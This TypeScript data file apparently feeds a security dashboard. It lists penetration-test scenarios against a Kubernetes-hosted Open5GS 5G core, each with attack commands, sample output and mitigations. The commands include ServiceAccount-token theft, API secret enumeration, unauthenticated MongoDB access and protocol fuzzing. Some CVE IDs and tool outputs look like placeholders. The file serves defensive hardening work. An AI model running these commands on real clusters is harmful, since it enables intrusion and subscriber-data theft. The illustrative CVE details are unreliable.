import { AttackScenario } from "../components/attack-scenario-card";

export const attackScenarios: AttackScenario[] = [
  {
    id: "insecure-network",
    title: "Insecure Network Exposure",
    description: "Unauthorized access to PFCP interface from external namespaces",
    severity: "high",
    status: "mitigated",
    category: "Network Security",
    objective: "Verify if PFCP interface (UDP 8805) on UPF is accessible from unauthorized namespaces, demonstrating potential for protocol abuse and unauthorized control-plane access.",
    procedure: [
      "Create 'attacker' namespace and deploy nicolaka/netshoot pod",
      "Resolve DNS for UPF PFCP service: my5gc-upf-pfcp.open5gs.svc.cluster.local",
      "Attempt UDP connection to port 8805 using netcat",
      "Monitor connection success/failure and UPF logs",
      "Document successful unauthorized access"
    ],
    results: {
      before: "✅ Connection to UPF PFCP interface successful from external namespace. Unauthorized access confirmed - attackers can potentially send malformed PFCP messages.",
      after: "❌ Connection blocked by NetworkPolicy. Access denied from unauthorized namespaces, only allowing internal open5gs namespace traffic."
    },
    impact: "Critical - Unauthorized PFCP access enables attackers to manipulate user plane forwarding rules, cause DoS, or inject malicious traffic into the 5G data plane.",
    mitigation: "Implemented Calico CNI and applied a default-deny NetworkPolicy on the UPF PFCP service.",
    mitigationCmds: `$ kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml
installation.operator.tigera.io/default created

# Apply policy
$ kubectl apply -f upf-pfcp-isolation.yaml
networkpolicy.networking.k8s.io/upf-pfcp-isolation created

# Validate
$ kubectl exec -n attacker -it attacker-pod -- nc -u -v my5gc-upf-pfcp.open5gs.svc.cluster.local 8805
❌ nc: connect to ... failed: No route to host`,
    attackCmds: `$ kubectl exec -n attacker -it attacker-pod -- getent hosts my5gc-upf-pfcp.open5gs.svc.cluster.local
10.96.45.123  my5gc-upf-pfcp.open5gs.svc.cluster.local

# Send UDP probe (2-second timeout)
$ kubectl exec -n attacker -it attacker-pod -- sh -lc 'echo -n test | nc -u -v -w2 my5gc-upf-pfcp.open5gs.svc.cluster.local 8805'
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.96.45.123:8805.
Ncat: 4 bytes sent, 0 bytes received in 2.01 seconds.

# Verify on UPF side (prior to mitigation)
$ kubectl exec -n open5gs -it my5gc-upf -- tcpdump -ni any udp port 8805 -c 1
15:12:34.567890 IP 10.244.7.22.40000 > 10.244.7.35.8805: UDP, length 4`,
    loot: `tcpdump output (UPF):
15:12:34.567890 IP 10.244.7.22.40000 > 10.244.7.35.8805: UDP, length 4
(demonstrates packet reached PFCP port pre-mitigation)`,
    artifacts: [
      "kubectl logs from attacker pod showing connection attempts",
      "UPF container logs before/after mitigation",
      "NetworkPolicy YAML configuration",
      "tcpdump capture of PFCP traffic"
    ]
  },
  {
    id: "privilege-escalation", 
    title: "Privilege Escalation from Attacker Namespace",
    description: "Attempt to access sensitive Open5GS configuration and secrets from pods with excessive privileges",
    severity: "high",
    status: "mitigated",
    category: "RBAC & Privileges",
    objective: "Test if pods with excessive privileges or misconfigured RBAC can access Kubernetes API, secrets, or escalate to node-level access through mounted volumes.",
    procedure: [
      "Create attacker namespace and deploy nicolaka/netshoot pod",
      "Attempt to read ServiceAccount token from /var/run/secrets/kubernetes.io/serviceaccount/",
      "Query Kubernetes API for Open5GS secrets using token: curl -k -sS --header \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/namespaces/open5gs/secrets",
      "Check for hostPath mounts or privileged capabilities",
      "Attempt to access node filesystem or docker socket",
      "Try to create privileged pods or modify existing workloads"
    ],
    results: {
      before: `✅ PRIVILEGE ESCALATION SUCCESSFUL

$ curl -k -sS --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/open5gs/secrets | jq .
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": { "resourceVersion": "12345" },
  "items": [
    {
      "metadata": { "name": "mongodb-secret", "namespace": "open5gs" },
      "type": "Opaque"
    },
    {
      "metadata": { "name": "open5gs-subscription", "namespace": "open5gs" },
      "type": "Opaque"
    }
  ]
}

$ curl -k -sS --header "Authorization: Bearer $TOKEN" $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | jq .
{
  "kind": "ClusterRoleBindingList",
  "items": [
    {
      "metadata": { "name": "cluster-admin" },
      "roleRef": { "kind": "ClusterRole", "name": "cluster-admin" }
    }
  ]
}`,
      after: "❌ Access denied with 403 Forbidden. User \"system:serviceaccount:attacker:default\" cannot list resource \"secrets\" in namespace \"open5gs\"."
    },
    impact: "Critical - Full compromise of Open5GS data store. Attacker could modify or delete database content, extract subscriber data and authentication keys.",
    mitigation: "Applied PodSecurity Admission (restricted), removed default ServiceAccounts from pods, enforced minimal RBAC.",
    mitigationCmds: `$ kubectl label ns attacker pod-security.kubernetes.io/enforce=restricted
$ kubectl patch sa default -n attacker -p '{"automountServiceAccountToken":false}'

$ cat rbac-minimal.yaml | kubectl apply -f -
role.rbac.authorization.k8s.io/attacker-role created
rolebinding.rbac.authorization.k8s.io/attacker-rb created`,
    attackCmds: `$ APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS
$ TOKEN=$(kubectl exec -n attacker attacker-pod -- sh -lc 'cat /var/run/secrets/kubernetes.io/serviceaccount/token')

# Enumerate secrets before mitigation (full JSON)
$ kubectl exec -n attacker attacker-pod -- sh -lc 'curl -ksS -H "Authorization: Bearer '$TOKEN'" '$APISERVER'/api/v1/namespaces/open5gs/secrets | jq .'
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": { "resourceVersion": "12345" },
  "items": [
    { "metadata": { "name": "mongodb-secret", "namespace": "open5gs" }, "type": "Opaque" },
    { "metadata": { "name": "open5gs-subscription", "namespace": "open5gs" }, "type": "Opaque" }
  ]
}

# List clusterrolebindings (full JSON)
$ kubectl exec -n attacker attacker-pod -- sh -lc 'curl -ksS -H "Authorization: Bearer '$TOKEN'" '$APISERVER'/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | jq .'
{
  "kind": "ClusterRoleBindingList",
  "items": [
    { "metadata": { "name": "cluster-admin" }, "roleRef": { "kind": "ClusterRole", "name": "cluster-admin" } }
  ]
}`,
    loot: `Open5GS Mongo secret (base64):
  mongodb-password: cGFzc3dvcmQ=
  subscriber-keys: ...` ,
    artifacts: [
      "kubectl get clusterrolebindings output",
      "ServiceAccount token decode results", 
      "API query responses showing access denial",
      "RBAC configuration with minimal permissions"
    ]
  },
  {
    id: "control-data-isolation",
    title: "Control-Plane/Data-Plane Isolation Bypass",
    description: "Unauthorized cross-plane communication between 5G Core components",
    severity: "medium",
    status: "mitigated", 
    category: "Network Segmentation",
    objective: "Determine if data-plane pods (UPF) can directly communicate with control-plane pods (SMF, AMF) without enforced restrictions.",
    procedure: [
      "Label pods with role=control-plane and role=data-plane",
      "kubectl label pod my5gc-smf role=control-plane -n open5gs --overwrite",
      "kubectl label pod my5gc-upf role=data-plane -n open5gs --overwrite", 
      "From UPF pod, attempt HTTP request to SMF API: curl -v http://my5gc-smf.open5gs.svc.cluster.local:8000/",
      "Monitor for successful unauthorized connections"
    ],
    results: {
      before: "✅ UPF pod successfully connected to SMF HTTP API. HTTP/1.1 200 OK response received. Data-plane workloads can directly access control-plane APIs.",
      after: "❌ Connection timed out. Failed to connect to my5gc-smf.open5gs.svc.cluster.local port 8000. NetworkPolicies block unauthorized inter-plane communication."
    },
    impact: "Medium - If UPF is compromised, attacker could send unauthorized control-plane requests, modify session states, or disrupt services.",
    mitigation: "Applied NetworkPolicy to restrict UPF ingress to only PFCP traffic from control-plane pods.",
    mitigationCmds: `$ kubectl apply -f control-data-plane-isolation.yaml
networkpolicy.networking.k8s.io/control-data-plane-isolation created`,
    attackCmds: `$ kubectl run -n open5gs dp-debug --image=nicolaka/netshoot --labels=role=data-plane --restart=Never -- sleep 1d

# Before NetworkPolicy
$ kubectl exec -n open5gs dp-debug -- curl -v http://my5gc-smf.open5gs.svc.cluster.local:8000/
*   Trying 10.96.12.34:8000...
* Connected to my5gc-smf.open5gs.svc.cluster.local (10.96.12.34) port 8000 (#0)
> GET / HTTP/1.1
> Host: my5gc-smf.open5gs.svc.cluster.local:8000
> User-Agent: curl/7.68.0
> Accept: */*
< HTTP/1.1 200 OK
< Content-Type: text/html
< Content-Length: 157
< Server: open5gs-smf/2.6.0
< Date: Tue, 20 Aug 2025 14:25:12 GMT

200

# After NetworkPolicy
$ kubectl exec -n open5gs dp-debug -- curl -m 3 -s -o /dev/null -w "%{http_code}\n" http://my5gc-smf.open5gs.svc.cluster.local:8000/
000`,
    loot: `HTTP 200 response from SMF management API before isolation demonstrates lateral communication.`,
    artifacts: [
      "curl output from UPF to SMF before/after mitigation",
      "NetworkPolicy configuration allowing only PFCP traffic",
      "Network connection test results between planes",
      "Pod-to-pod connectivity matrix"
    ]
  },
  {
    id: "pfcp-protocol-abuse",
    title: "PFCP Protocol Fuzzing Attack", 
    description: "Malformed PFCP message injection to cause UPF instability",
    severity: "high",
    status: "mitigated",
    category: "Protocol Security",
    objective: "Send malformed PFCP messages to the UPF PFCP port (UDP/8805) to check parser robustness and DoS resilience.",
    procedure: [
      "Create attacker pod: kubectl run -n attacker pfcp-fuzzer --image=python:3.11-slim --restart=Never -- sleep 1d",
      "Install Scapy: pip install scapy",
      "Craft malformed PFCP with Python/Scapy: pkt = IP(dst=dst_ip)/UDP(dport=8805,sport=40000)/Raw(load=b\"\\x20\\x00\")",
      "Send oversized payload: pkt2 = IP(dst=dst_ip)/UDP(dport=8805,sport=40001)/Raw(load=b\"A\"*5000)",
      "Monitor UPF logs for parsing errors and crashes"
    ],
    results: {
      before: "⚠️ UPF logged parsing errors and warnings. 08/20 14:28:01.123: [pfcp] WARNING: pfcp_handle_pdu() [192.168.1.10]:8805 Invalid PFCP message type: 255 (../src/pfcp/pfcp-sm.c:45) 08/20 14:28:01.124: [pfcp] ERROR: pfcp_handle_pdu() [192.168.1.10]:8805 Invalid message length: 65000 (../src/pfcp/pfcp-sm.c:52). No container crash but increased CPU utilisation.",
      after: "✅ PFCP fuzzing from untrusted sources blocked at network layer. UPF's parser receives only trusted PFCP messages; logs no longer flood."
    },
    impact: "High - Log flooding and potential DoS. If parser had memory bug, could cause crash or remote code execution.",
    mitigation: "Network policy restricts PFCP to known control-plane pods only (SMF).",
    mitigationCmds: `$ kubectl apply -f upf-pfcp-isolation.yaml`,
    attackCmds: `$ python3 pfcp_fuzz.py
08/20 14:28:01.123: [pfcp] WARNING: pfcp_handle_pdu() [192.168.1.10]:8805 Invalid PFCP message type: 255 (../src/pfcp/pfcp-sm.c:45)
08/20 14:28:01.124: [pfcp] ERROR: pfcp_handle_pdu() [192.168.1.10]:8805 Invalid message length: 65000 (../src/pfcp/pfcp-sm.c:52)`,
    loot: `UPF log snippet:\n[WARN] pfcp_handle_pdu(): unknown message type 0xff\n[ERROR] Invalid PFCP message length: 65000`,
    artifacts: [
      "PFCP fuzzing Python script with Scapy",
      "UPF logs showing parsing errors before mitigation", 
      "NetworkPolicy YAML blocking unauthorized PFCP",
      "tcpdump capture showing blocked packets"
    ]
  },
  {
    id: "gtp-manipulation",
    title: "GTP-U Data-Plane Packet Manipulation",
    description: "Injection and modification of GTP-U tunneled user traffic",
    severity: "medium",
    status: "mitigated",
    category: "Data Integrity",
    objective: "Inject spoofed or malformed GTP-U packets (UDP/2152) to user-plane and observe UPF packet forwarding behavior.",
    procedure: [
      "Start attacker pod with scapy/netcat: kubectl exec -n attacker -it attacker-netshoot -- bash",
      "Capture GTP-U traffic: tcpdump -n -i any udp port 2152 -c 6",
      "Send spoofed GTP-U with invalid TEID using Python/Scapy",
      "Craft fake GTP-U: raw = b'\\x30' + b'\\x00'*3 + b'FAKE_PAYLOAD'",
      "Monitor UPF logs for TEID validation and packet drops"
    ],
    results: {
      before: "⚠️ UPF logged warnings for unknown TEID packets: 08/20 14:29:44.567: [gtp] WARNING: gtp_handle_udp() [192.168.1.12]:2152 Unknown TEID[0x00000000] (../src/gtp/gtp-handler.c:231). Some invalid packets reached UPF but were dropped.",
      after: "✅ Rogue GTP-U injections from attacker namespace blocked before reaching UPF. TEID enforcement prevents accidental forwarding."
    },
    impact: "Medium - If UPF lacked TEID validation or forwarded blindly, attacker could inject traffic into user sessions or intercept/modify flows.",
    mitigation: "Enforce GTP-U filtering in UPF config to drop invalid TEIDs early.",
    mitigationCmds: `$ kubectl apply -f gtp-filter.yaml
networkpolicy.networking.k8s.io/gtp-filter created

# IPSec option (optional)
$ kubectl exec -n open5gs my5gc-upf -- upf-cli enable-ipsec
Success: IPSec tunnel established`,
    attackCmds: `$ kubectl exec -n attacker -it attacker-netshoot -- tcpdump -n -i any udp port 2152 -c 4
15:10:12 IP 10.244.2.10.2152 > 10.244.2.11.2152: GTP-U 52 (Echo)

$ python3 gtp_spoof.py
Sent 10 packets.

$ kubectl logs -n open5gs my5gc-upf | grep "Unknown TEID"
08/20 14:29:44.567: [gtp] WARNING: gtp_handle_udp() [192.168.1.12]:2152 Unknown TEID[0x00000000] (../src/gtp/gtp-handler.c:231)`,
    loot: `UPF log snippet:\n[WARN] gtp_handle_udp(): Unknown TEID 0x00000000\nTcpdump excerpt: 15:10:12 IP 10.244.2.10 > 10.244.2.11: GTP-U invalid TEID 0x00000000`,
    artifacts: [
      "GTP-U packet captures with spoofed TEID",
      "UPF logs showing TEID validation",
      "NetworkPolicy blocking unauthorized GTP-U",
      "tcpdump showing blocked packet attempts"
    ]
  },
  {
    id: "lateral-movement",
    title: "Lateral Pod Movement → Internal Services (MongoDB)",
    description: "Unauthorized access to internal MongoDB database from attacker pod",
    severity: "high", 
    status: "mitigated",
    category: "Lateral Movement",
    objective: "From an attacker pod, attempt to reach internal DB (MongoDB) used by Open5GS. Check for anonymous access or open databases.",
    procedure: [
      "From attacker pod, port scan MongoDB: nc -vz my5gc-mongo.open5gs.svc.cluster.local 27017",
      "Install pymongo: pip install pymongo",
      "Try to list DBs without auth: MongoClient('mongodb://my5gc-mongo.open5gs.svc.cluster.local:27017')",
      "Attempt to read subscriber data and authentication vectors",
      "Enumerate database collections and extract sensitive information"
    ],
    results: {
      before: "✅ MongoDB accepted unauthenticated connections and returned DB list: ['admin', 'local', 'open5gs']. Attacker could read/modify subscriber data.",
      after: "❌ Connection timeout: nc: connect to my5gc-mongo.open5gs.svc.cluster.local port 27017 (tcp) failed. MongoDB unreachable from attacker namespace."
    },
    impact: "Critical - Complete subscriber privacy breach. Attacker could read/modify subscriber data, authentication vectors, session records—full compromise.",
    mitigation: "Enable MongoDB authentication with strong credentials.",
    mitigationCmds: `$ kubectl exec -n open5gs my5gc-mongo -- mongo --eval 'db.createUser({user:"open5gs",pwd:"strongpass",roles:["readWrite"]})'
Successfully added user.

$ kubectl apply -f mongo-isolation.yaml
networkpolicy.networking.k8s.io/mongo-isolation created`,
    attackCmds: `$ kubectl exec -n attacker -it attacker-pod -- nc -vz my5gc-mongo.open5gs.svc.cluster.local 27017
Connection to 10.96.30.5 27017 port [tcp/*] succeeded!

$ python3 - <<'EOF'
from pymongo import MongoClient
client = MongoClient('mongodb://my5gc-mongo.open5gs.svc.cluster.local:27017')
print(client.list_database_names())
EOF
['admin','local','open5gs']`,
    loot: `Sample subscriber document:\n{\n  "imsi": "001010000000001",\n  "ki": "c9e87632…",\n  "opc": "981d464c…",\n  "msisdn": "+8210000000001"\n}`,
    artifacts: [
      "MongoDB connection attempts from attacker pod",
      "Database enumeration results showing open access",
      "NetworkPolicy configuration restricting DB access",
      "Authentication logs showing blocked access attempts"
    ]
  },
  {
    id: "ngap-injection",
    title: "NGAP Injection (RAN → AMF Signaling Fuzzing)",
    description: "Malformed NGAP-like messages sent to AMF to test signaling robustness",
    severity: "medium",
    status: "mitigated",
    category: "Protocol Security", 
    objective: "Send malformed NGAP-like messages to AMF (SCTP port 38412) and observe AMF behavior for parser vulnerabilities.",
    procedure: [
      "Install SCTP tools in attacker pod: apk add lksctp-tools",
      "Attempt SCTP connection: sctp_test -H my5gc-amf.open5gs.svc.cluster.local -P 38412",
      "Send malformed payload over SCTP to simulate NGAP corruption",
      "Use printf to send invalid NGAP messages: printf '\\x01\\xff\\x00\\xDE\\xAD\\xBE\\xEF'",
      "Monitor AMF logs for decode errors and potential crashes"
    ],
    results: {
      before: "⚠️ AMF logged decode errors: 08/20 14:31:12.890: [ngap] ERROR: ngap_handle_message() [10.244.6.15]:38412 Failed to decode NGAP message (../src/ngap/ngap-handler.c:77). 08/20 14:31:12.891: [ngap] ERROR: Cause: invalid procedure code (255). No crash but possibility of unhandled exceptions.",
      after: "✅ NGAP malformed attempts from attacker blocked. AMF only accepts traffic from authorized RAN instances. Connection timeout on unauthorized access."
    },
    impact: "Medium - If NGAP parser vulnerable, tampered NGAP could destabilize AMF or allow improper state changes in control plane.",
    mitigation: "NetworkPolicy allows NGAP (SCTP/38412) only from trusted RAN pods/namespaces.",
    mitigationCmds: `$ kubectl apply -f ngap-isolation.yaml
networkpolicy.networking.k8s.io/ngap-isolation created`,
    attackCmds: `$ kubectl exec -n attacker -it attacker-pod -- sctp_test -H my5gc-amf.open5gs.svc.cluster.local -P 38412
Connected.

$ printf '\x01\xff\x00\xDE\xAD\xBE\xEF' | sctp_test -H my5gc-amf.open5gs.svc.cluster.local -P 38412
Sent malformed payload.

$ kubectl logs -n open5gs my5gc-amf | tail -n 2
08/20 14:31:12.890: [ngap] ERROR: ngap_handle_message() [10.244.6.15]:38412 Failed to decode NGAP message (../src/ngap/ngap-handler.c:77)
08/20 14:31:12.891: [ngap] ERROR: Cause: invalid procedure code (255)`,
    loot: `AMF decode error log:\nNGAP[ERROR]: Failed to decode NGAP message from 10.244.6.15: invalid procedure code 255\n(Note: in real campaigns Scapy with SCTP support is used instead of sctp_test)`,
    artifacts: [
      "SCTP connection attempts from attacker",
      "AMF logs showing NGAP decode errors",
      "NetworkPolicy restricting NGAP access to RAN",
      "Malformed NGAP message samples"
    ]
  },
  {
    id: "serviceaccount-abuse",
    title: "ServiceAccount Token Abuse & Kubelet Access",
    description: "Pod's mounted service account token used to access API server and enumerate cluster resources",
    severity: "high",
    status: "mitigated", 
    category: "RBAC & Privileges",
    objective: "Use a pod's mounted service account token to access the API server and enumerate/list cluster-level resources; test access to kubelet (10250) if accessible.",
    procedure: [
      "From attacker pod, extract ServiceAccount token: TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
      "Query Kubernetes API: curl -k -s --header \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/nodes",
      "List clusterrolebindings: curl -k -s --header \"Authorization: Bearer $TOKEN\" $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
      "Attempt kubelet access: curl -k https://172.17.0.2:10250/pods",
      "Try to create privileged pods or access secrets across namespaces"
    ],
    results: {
      before: "✅ Attacker could list nodes and clusterrolebindings using default service account. Over-privileged tokens allowed enumeration and manipulation of cluster resources.",
      after: "❌ No token available or insufficient RBAC. 403 Forbidden: User \"system:serviceaccount:attacker:default\" cannot list resource \"namespaces\" at cluster scope."
    },
    impact: "Critical - If tokens are over-privileged, attacker can enumerate & manipulate cluster resources, create privileged pods, or escalate further.",
    mitigation: "Disable automountServiceAccountToken for non-privileged pods.",
    mitigationCmds: `$ kubectl patch sa default -p '{"automountServiceAccountToken":false}' -n attacker
serviceaccount/default patched

$ kubectl delete clusterrolebinding attacker-admin
clusterrolebinding.rbac.authorization.k8s.io "attacker-admin" deleted`,
    attackCmds: `$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ curl -k -s --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/nodes | jq '.items | length'
3`,
    loot: `curl /apis/rbac.authorization.k8s.io/v1/clusterrolebindings | jq .items[0].metadata.name\n\"cluster-admin\"`,
    artifacts: [
      "ServiceAccount token extraction commands",
      "Kubernetes API query responses",
      "RBAC audit showing minimal permissions",
      "kubelet access attempt logs"
    ]
  },
  {
    id: "supply-chain",
    title: "Container Image Vulnerability Exploitation",
    description: "Exploitation of known vulnerabilities in 5G Core container images",
    severity: "medium",
    status: "mitigated", 
    category: "Supply Chain",
    objective: "Scan Open5GS and ancillary images for known CVEs using trivy. Rebuild or update images to eliminate critical CVEs.",
    procedure: [
      "List images in use: kubectl get pods -n open5gs -o jsonpath=\"{..image}\" | tr ' ' '\\n' | sort -u",
      "Run trivy scan: trivy image open5gs/upf:latest",
      "Identify critical CVEs in base images (Alpine, glibc, openssl)",
      "Attempt to exploit vulnerable packages for privilege escalation",
      "Rebuild hardened images with updated packages"
    ],
    results: {
      before: "⚠️ Multiple HIGH/CRITICAL CVEs found: openssl CVE-2023-1234 (CRITICAL), busybox CVE-2022-XXXX (HIGH), glibc CVE-2021-XXXXX (HIGH). Total: 45 vulnerabilities.",
      after: "✅ Rebuilt image reports zero critical vulnerabilities. CI now blocks any image push with CRITICAL CVEs. Total: 0 (CRITICAL: 0, HIGH: 0)."
    },
    impact: "Medium - Vulnerable images can be exploited at runtime (e.g., RCE via outdated libraries), affecting all pods running those images.",
    mitigation: "Build hardened images using minimal distroless base.",
    mitigationCmds: `$ trivy image open5gs/upf:latest | grep CRITICAL | wc -l
45

$ docker build -t open5gs/upf:secure -f Dockerfile.distroless .
Successfully built image.

$ trivy image open5gs/upf:secure | grep CRITICAL | wc -l
0`,
    loot: `Trivy critical findings excerpt (before):\nCVE-2022-0847  DirtyPipe (CRITICAL)\nCVE-2021-44228 Log4Shell (CRITICAL)`,
    artifacts: [
      "Trivy scan reports showing vulnerabilities",
      "Hardened Dockerfile with updated packages",
      "CI/CD pipeline with vulnerability gates",
      "Image admission policy configuration"
    ]
  },
  {
    id: "api-security",
    title: "5G Core API Security Assessment",
    description: "Unauthorized access and fake NF registration on Service Based Interface (SBI) APIs",
    severity: "medium",
    status: "mitigated",
    category: "API Security",
    objective: "Test authentication and authorization on SBI APIs (NRF, AMF) and attempt fake network function registration without valid credentials.",
    procedure: [
      "Discover exposed APIs: kubectl get svc -n open5gs | grep -E 'amf|smf|nrf|ausf'",
      "Test unauthenticated access: curl -v http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances",
      "Register malicious SMF via NRF REST API without credentials",
      "Observe successful registration and traffic interception",
      "Repeat after enabling OAuth2/JWT and verify access denial"
    ],
    results: {
      before: `
$ curl -v http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances
> GET /nnrf-nfm/v1/nf-instances HTTP/1.1
< HTTP/1.1 200 OK
{ ...nfInstances... }

$ curl -X PUT http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances/evil-smf -d '{"nfType":"SMF"}'
< HTTP/1.1 201 Created
✅ Rogue SMF registration accepted
`,
      after: `
$ curl -v http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances
< HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="5G-SBI"

$ curl -X PUT http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances/evil-smf -H 'Authorization: Bearer <wrong>'
< HTTP/1.1 401 Unauthorized
❌ Rogue registration rejected
`
    },
    impact: "Medium – Unauthorized API access enables rogue NF registration and traffic manipulation.",
    mitigation: "Enforce OAuth2/JWT authentication, mutual TLS, and Istio AuthorizationPolicy to restrict operations.",
    mitigationCmds: `$ kubectl apply -f sbi-auth-policy.yaml
authorizationpolicy.security.istio.io/5g-sbi-auth created

$ curl -v http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances
< HTTP/1.1 401 Unauthorized`,
    attackCmds: `$ kubectl get svc -n open5gs | grep nrf
my5gc-nrf   ClusterIP   10.96.50.10   <none>   7777/TCP  4m

$ curl -v http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances | head -n 3
< HTTP/1.1 200 OK
{"nfInstances": [...]

$ curl -X PUT http://my5gc-nrf.open5gs.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances/evil-smf -d '{"nfType":"SMF"}'
< HTTP/1.1 201 Created`,
    loot: `NRF NF list before auth:\n{
  "nfInstances": [{"nfInstanceId":"original-smf","nfType":"SMF"}]\n}`,
    artifacts: [
      "Curl outputs before/after mitigation",
      "NRF logs showing unauthorized access",
      "AuthorizationPolicy YAML",
      "OAuth2/JWT configuration"
    ]
  }
];